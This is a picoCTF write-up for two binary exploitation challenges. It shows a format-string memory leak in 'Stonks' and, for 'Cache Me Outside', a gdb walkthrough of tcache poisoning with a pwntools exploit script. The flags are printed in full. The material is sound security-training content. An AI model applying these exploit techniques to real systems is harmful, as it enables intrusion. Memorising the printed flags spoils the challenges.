# Binary Exploitation
## Stonks ![p](https://img.shields.io/badge/Points-20-success) ![c](https://img.shields.io/badge/Binary-darkred)

We are given a C source file, so let's search for vulnerabilities. There is a clear _format string_ vulnerability at line 93, in the `buy_stonks` function:

```c
printf("What is your API token?\n");
scanf("%300s", user_buf);
printf("Buying stonks with token:\n");
printf(user_buf);
```

Now we know we can use this to print what we need from the memory. Let's try locally, using a custom `api` file (the flag one) to easily recognize if we got the content, take a bunch of 'A's to try. If we then submit a sequence of `%x`s as input, we will leak the memory and see a sequence of 41, our flag file.

With no hesitation we can simply connect to the remote program and do the same, leaking at some point (after converting it into ASCII) `ocip{FTC0l_I4_t5m_ll0m_y_y3n2fc10a10\xff\xfb\x00}` that is clearly our flag. 

Just reverse it 4 by 4 characters and we obtain the flag: **picoCTF{I_l05t_4ll_my_m0n3y_1cf201a0}**

## Cache Me Outside ![p](https://img.shields.io/badge/Points-70-success) ![c](https://img.shields.io/badge/Binary-darkred)
> While being super relevant with my meme references, I wrote a program to see how much you understand heap allocations. nc mercury.picoctf.net 10097 [heapedit](https://mercury.picoctf.net/static/97a073d6009c8cbd05d03b91ac3a620b/heapedit) [Makefile](https://mercury.picoctf.net/static/97a073d6009c8cbd05d03b91ac3a620b/Makefile) [libc.so.6](https://mercury.picoctf.net/static/97a073d6009c8cbd05d03b91ac3a620b/libc.so.6)

First thing to do, open this with `Ghidra` and see the instructions:
```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined my_value;
  int my_address;
  int index;
  undefined8 *first_chunk;
  undefined8 *flag_chunk;
  FILE *flag_len;
  undefined8 *rand_chunk;
  void *new_buffer;
  undefined8 rand_1;
  undefined8 rand_2;
  undefined8 rand_3;
  undefined rand_4;
  char flag [72];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  flag_len = fopen("flag.txt","r");
  fgets(flag,0x40,flag_len);
  rand_1 = 0x2073692073696874;
  rand_2 = 0x6d6f646e61722061;
  rand_3 = 0x2e676e6972747320;
  rand_4 = 0;
  first_chunk = (undefined8 *)0x0;
  index = 0;
  while (index < 7) {
    flag_chunk = (undefined8 *)malloc(0x80);
    if (first_chunk == (undefined8 *)0x0) {
      first_chunk = flag_chunk;
    }
    *flag_chunk = 0x73746172676e6f43;
    flag_chunk[1] = 0x662072756f592021;
    flag_chunk[2] = 0x203a73692067616c;
    *(undefined *)(flag_chunk + 3) = 0;
    strcat((char *)flag_chunk,flag);
    index = index + 1;
  }
  rand_chunk = (undefined8 *)malloc(0x80);
  *rand_chunk = 0x5420217972726f53;
  rand_chunk[1] = 0x276e6f7720736968;
  rand_chunk[2] = 0x7920706c65682074;
  *(undefined4 *)(rand_chunk + 3) = 0x203a756f;
  *(undefined *)((long)rand_chunk + 0x1c) = 0;
  strcat((char *)rand_chunk,(char *)&rand_1);
  free(flag_chunk);
  free(rand_chunk);
  my_address = 0;
  my_value = 0;
  puts("You may edit one byte in the program.");
  printf("Address: ");
  __isoc99_scanf(&%d_GLOBAL,&my_address);
  printf("Value: ");
  __isoc99_scanf(&%c_GLOBAL,&my_value);
  *(undefined *)((long)my_address + (long)first_chunk) = my_value;
  new_chunk = malloc(0x80);
  puts((char *)((long)new_chunk + 0x10));
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

What this program does is:
- read `flag.txt` and store it in a variable
- allocate a chunk of `0x80` 7 times (`flag_chunk`), containing "Congrats! Your flag is: <flag>", overwriting the pointer without freeing data
- store the `first_chunk` address in a variable
- after the loop allocate another chunk, `rand_chunk`, containing "Sorry, this will not help you: this is a random string"
- free `flag_chunk` and `rand_chunk` without zeroing them
- take `my_address` and `my_value` and use them `*(first_chunk + my_address) = my_value`, use address as offset from the first chunk and modify a byte
- allocate a `new_chunk` of the same size of the others and print it 

### Idea
We can identify a main vulnerability here: due to the fact that some chunks are freed (with size of 0x80) and a new one is allocated (with same size) the GCLIB's **tcache** mechanism will take part of this.  
[tcache](https://sourceware.org/glibc/wiki/MallocInternals#Thread_Local_Cache_.28tcache.29) (Thread Local Cache) is a powerful yet dangerous performance optimization method, that basically works like this (refer to the link for a better explanation).  
To speed up memory allocation, the allocator does not always search through all of the heap memory but it tries to reuse as many chunks as possible instead. That is, if we free a 0x80 size chunk and then we malloc a 0x80 size chunk, the former will be used to allocate the latter.

If we run the program with some random arguments, this is the result we get this, confirming all said before (the output is part of the previously freed `rand_chunk`):

IMAGE

The idea is that we can exploit the `tcache`, because of `new_chunk` allocation and print after `rand_chunk` free. We need to change the tcache value to point at the `flag_chunk` so that the print will actually print the flag.  
Luckily enough is the program itself to provided us a way to write a chosen value in a chosen address in memory.

### Pwn
Now what we can do to really understand the program flow is to run it with `gdb` and carefully look at registers and memory addresses. First I run `disassemble main` to see all assembly instructions and their address. I will not report here the output, but we can now mark down 3 important addresses where we can break and analyze the memory state: 0x4008c3, 0x4009a8, 0x4009b4.

**_0x4008c3_**: if break here, after the very first `malloc` executed, `RAX` will contain its return value. That is, the `first_chunk` (0x6034a0 in this case).

**_0x4009a8_**: is the instruction right after the first free, breakpoint here and look at `tcache` to get a confirmation
```
pwndbg> tcache
{
  counts = "\000\000\000\000\000\000\000\001", '\000' <repeats 55 times>, 
  entries = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x603800, 0x0 <repeats 56 times>}
}
```

As expected, this is the pointer at `flag_chunk`, the first freed chunk

**_0x4009b4_**: is the instruction right after the second free, again breakpoint and `tcache`
```
pwndbg> tcache
{
  counts = "\000\000\000\000\000\000\000\002", '\000' <repeats 55 times>, 
  entries = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x603890, 0x0 <repeats 56 times>}
}
```

As expected now there is the last freed chunk, so `rand_chunk`: only the last one is referred, in fact this points to the preceeding one, and so on:
```
pwndbg> x/4xg 0x603890
0x603890:	0x0000000000603800	0x276e6f7720736968
0x6038a0:	0x7920706c65682074	0x73696874203a756f
```

We need to find the last value (0x603890) in the heap, because we will need to modify it: the pointer at tcache (containing the pointer to the freed chunk) must be somewhere here.  
To execute the `find` command in gdb we need to specify the starting and ending addresses of the search space, i.e. the heap: `info proc mappings` returns us start = 0x602000, end = 0x623000

Now we can run:
```
pwndbg> find 0x602000, 0x623000, 0x603890
0x602088
warning: Unable to access 7029 bytes of target memory at 0x62148c, halting search.
1 pattern found.
```

So the heap address 0x602088 (call it `tcache_pointer`) contains the pointer to the last freed chunk (0x603890), the one we want to modify.  
To make the exploit work, we need to change the address of the `tcache_pointer` from pointing to the `rand_chunk` (0x603890) to pointing to the `flag_chunk` (0x603800). This is perfect because we can only modify a byte in memory, and 0x603890 can be easily modified to 0x603800 by replacing the last byte with a 0 byte.

We can now calculate the offset we will send to the program as `0x602088 - 0x6034a0 = -5144`, this is the relative offset that will be fixed for every execution, even if the two values changes due to memory space randomization. _Notice that in classical heap challenges we typically have an heap address leak and then we can calculate all needed offsets; here the concept is the same, with `first_chunk` behaving as the leaked address._

Now we just need to replace the last byte with a `\x00`, let's script that:
```python
from pwn import *

r = remote("mercury.picoctf.net", 10097)

offset = 0x602088 - 0x6034a0
new_value = b'\x00'

r.recvuntil(': ')
r.sendline(str(offset))     # send Address

r.recvuntil(': ')
r.sendline(new_value)         # send Value

r.interactive()
```

Flag: **picoCTF{97c85bbf2168f674263a1c5629b411a3}**
